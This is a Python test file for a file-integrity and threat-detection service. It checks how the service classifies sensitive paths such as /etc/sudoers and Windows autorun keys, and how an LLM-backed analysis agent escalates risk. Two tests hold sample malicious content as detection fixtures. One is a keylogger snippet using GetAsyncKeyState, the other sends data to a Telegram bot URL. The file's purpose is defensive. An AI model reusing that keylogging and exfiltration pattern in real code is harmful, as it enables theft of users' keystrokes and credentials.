import os
import sys
import json
from unittest import mock

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from core.models import Base, FileLog
from core.config import settings
from core.services.file_registry import classify_file, upsert_registry_entry
from core.services.registry_analyzer import (
    apply_registry_floor,
    build_registry_signal,
    prepare_registry_analysis,
    run_mempalace_context_analysis,
)
from core.services.mempalace_agent import (
    MemPalaceAgentCore,
    PydanticAITypedLLMAdapter,
    build_mempalace_event,
)


def _session():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    return sessionmaker(bind=engine)()


def test_classify_privilege_policy_file():
    result = classify_file("/etc/sudoers", metadata={"size": 128})

    assert result["tier"] == 1
    assert result["tier_label"] == "Critical"
    assert result["semantic_role"] == "privilege_policy"
    assert result["asset_type"] == "auth"


def test_registry_signal_escalates_critical_identity_change():
    session = _session()
    upsert_registry_entry(
        session=session,
        path="/etc/sudoers",
        metadata={"size": 128, "is_baseline": True},
        file_hash="abc",
        file_id=42,
        is_baseline=True,
    )
    session.commit()

    log = FileLog(
        file_id=42,
        path="/etc/sudoers",
        event_type="modified",
        old_hash="abc",
        new_hash="def",
        analysis_json={"metadata": {"is_baseline": False}},
    )
    context = {"metadata": {"is_baseline": False}}

    registry, signal = prepare_registry_analysis(session, log, context)

    assert registry["semantic_role"] == "privilege_policy"
    assert signal["priority"] == "critical"
    assert signal["minimum_risk_score"] == 9
    assert context["metadata"]["registry"]["tier"] == 1

    low_content_verdict = {
        "risk_score": 1,
        "priority": "info",
        "reasoning": "No readable content was available.",
        "analysis_source": "heuristic",
        "findings": [],
        "recommended_actions": [],
    }
    merged = apply_registry_floor(low_content_verdict, signal)

    assert merged["priority"] == "critical"
    assert merged["risk_score"] == 9
    assert merged["identity_risk"] is True
    assert merged["semantic_role"] == "privilege_policy"


def test_registry_signal_ignores_baseline_initialization():
    classification = classify_file("/bin/ls", metadata={"is_baseline": True})
    signal = build_registry_signal("new", classification, is_baseline=True)

    assert signal is None


def test_classify_windows_registry_autorun_key():
    result = classify_file(
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        metadata={"size": 1},
    )

    assert result["path"] == r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    assert result["tier"] == 1
    assert result["semantic_role"] == "machine_autorun_registry"
    assert result["asset_type"] == "persistence"


def test_classify_windows_scheduled_task_file():
    result = classify_file(
        r"C:\Windows\System32\Tasks\EvilTask",
        metadata={"size": 256},
        target_os="windows",
    )

    assert result["tier"] == 2
    assert result["semantic_role"] == "windows_scheduled_task"
    assert result["asset_type"] == "persistence"


def test_mempalace_agent_produces_windows_context():
    event = build_mempalace_event(
        path=r"C:\Windows\System32\Tasks\EvilTask",
        event_type="modified",
        event_context={
            "metadata": {
                "is_baseline": False,
                "registry": classify_file(
                    r"C:\Windows\System32\Tasks\EvilTask",
                    target_os="windows",
                ),
            }
        },
        content_analysis={
            "risk_score": 8,
            "priority": "high",
            "is_malicious": True,
            "threat_type": "persistence",
            "threat_classification": "Suspicious Scheduled Task Persistence",
            "reasoning": "The task executes an unexpected command.",
            "recommended_actions": [],
            "findings": [],
        },
    )

    verdict = MemPalaceAgentCore().evaluate(event)

    assert verdict.os_family == "windows"
    assert verdict.semantic_role == "windows_scheduled_task"
    assert verdict.priority == "high"
    assert "Task Scheduler" in " ".join(verdict.recommended_actions)


def test_mempalace_merge_is_persisted_with_registry_analysis():
    session = _session()
    upsert_registry_entry(
        session=session,
        path=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        metadata={"is_baseline": True},
        file_hash="abc",
        file_id=7,
        is_baseline=True,
    )
    session.commit()

    log = FileLog(
        file_id=7,
        path=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        event_type="modified",
        old_hash="abc",
        new_hash="def",
        analysis_json={"metadata": {"is_baseline": False}},
    )
    context = {"metadata": {"is_baseline": False}}
    _, signal = prepare_registry_analysis(session, log, context)

    low_content_verdict = {
        "risk_score": 1,
        "priority": "info",
        "reasoning": "No content available.",
        "analysis_source": "heuristic",
        "findings": [],
        "recommended_actions": [],
    }

    merged = run_mempalace_context_analysis(
        log=log,
        event_context=context,
        content_payload="",
        content_analysis=apply_registry_floor(low_content_verdict, signal),
        registry_signal=signal,
    )

    assert merged["priority"] == "critical"
    assert merged["mem_palace_agent"] is True
    assert merged["mem_palace"]["os_family"] == "windows"
    assert merged["mem_palace"]["semantic_role"] == "machine_autorun_registry"


def test_mempalace_agent_analyzes_content_without_pipeline_verdict():
    event = build_mempalace_event(
        path=r"C:\Users\dev\project\key.java",
        event_type="new",
        event_context={
            "metadata": {
                "is_baseline": False,
                "registry": classify_file(r"C:\Users\dev\project\key.java", target_os="windows"),
            }
        },
        content_excerpt=(
            "import java.net.*;\n"
            "class KeyCapture { void run(){ GetAsyncKeyState(13); "
            "new URL(\"https://api.telegram.org/botTOKEN/sendMessage\"); }}\n"
        ),
        content_analysis={
            "risk_score": 1,
            "priority": "info",
            "threat_type": "benign",
            "analysis_source": "heuristic",
            "reasoning": "The pipeline did not identify a threat.",
        },
    )

    verdict = MemPalaceAgentCore().evaluate(event)

    assert verdict.agent_content.inspected is True
    assert verdict.agent_content.risk_score >= 9
    assert verdict.priority == "critical"
    assert verdict.content_risk is True
    assert verdict.threat_type == "credential_theft"
    assert "api.telegram.org" in verdict.agent_content.iocs


def test_mempalace_merge_escalates_from_agent_content_analysis():
    log = FileLog(
        file_id=101,
        path=r"C:\Users\dev\project\key.java",
        event_type="new",
        new_hash="abc",
        analysis_json={"metadata": {"is_baseline": False}},
    )
    registry = classify_file(r"C:\Users\dev\project\key.java", target_os="windows")
    context = {"metadata": {"is_baseline": False, "registry": registry}}
    low_content_verdict = {
        "risk_score": 1,
        "priority": "info",
        "threat_type": "benign",
        "analysis_source": "heuristic",
        "reasoning": "Pipeline verdict was low risk.",
        "findings": [],
        "recommended_actions": [],
    }

    merged = run_mempalace_context_analysis(
        log=log,
        event_context=context,
        content_payload="GetAsyncKeyState(13); fetch('https://api.telegram.org/botTOKEN/sendMessage');",
        content_analysis=low_content_verdict,
    )

    assert merged["priority"] == "critical"
    assert merged["risk_score"] >= 9
    assert merged["threat_type"] == "credential_theft"
    assert merged["mem_palace"]["agent_content"]["inspected"] is True
    assert "mempalace_agent" in merged["analysis_source"]


def test_mempalace_agent_can_call_ollama_adapter(monkeypatch):
    monkeypatch.setattr(settings, "mempalace_agent_mode", "llm")
    monkeypatch.setattr(settings, "mempalace_agent_llm_enabled", True)
    payload = {
        "agent_name": "MemPalace File Intelligence",
        "adapter": "ollama",
        "agent_mode": "llm",
        "tools_used": ["registry_memory_lookup", "change_payload_inspection"],
        "os_family": "windows",
        "memory_scope": "windows/code/source_code",
        "tier": 3,
        "semantic_role": "source_code",
        "asset_type": "code",
        "identity_summary": "Tier 3 code asset.",
        "platform_context": "Windows developer workspace file.",
        "change_interpretation": "Agent inspected the code directly.",
        "expected_change_sources": ["developer_change"],
        "risk_score": 7,
        "priority": "high",
        "identity_risk": False,
        "content_risk": True,
        "agent_content": {
            "inspected": True,
            "risk_score": 7,
            "priority": "high",
            "threat_type": "persistence",
            "threat_classification": "Agent LLM Persistence Finding",
            "summary": "The LLM agent inspected content.",
            "findings": [],
            "iocs": [],
        },
        "threat_type": "persistence",
        "threat_classification": "Agent LLM Persistence Finding",
        "confidence": "high",
        "reasoning": "The MemPalace agent performed its own model analysis.",
        "findings": [],
        "recommended_actions": ["Review the agent finding."],
    }
    fake = mock.Mock()
    fake.status_code = 200
    fake.json.return_value = {"response": json.dumps(payload)}
    event = build_mempalace_event(
        path=r"C:\Users\dev\project\agent.java",
        event_type="modified",
        content_excerpt="Register-ScheduledTask();",
        content_analysis={"analysis_source": "heuristic", "risk_score": 1},
    )

    with mock.patch.object(PydanticAITypedLLMAdapter, "_call_pydantic_ai", return_value=None), \
         mock.patch("core.services.mempalace_agent.requests.post", return_value=fake) as post:
        verdict = MemPalaceAgentCore().evaluate(event)

    assert verdict.adapter == "ollama"
    assert verdict.agent_mode == "llm"
    assert verdict.reasoning == "The MemPalace agent performed its own model analysis."
    post.assert_called_once()
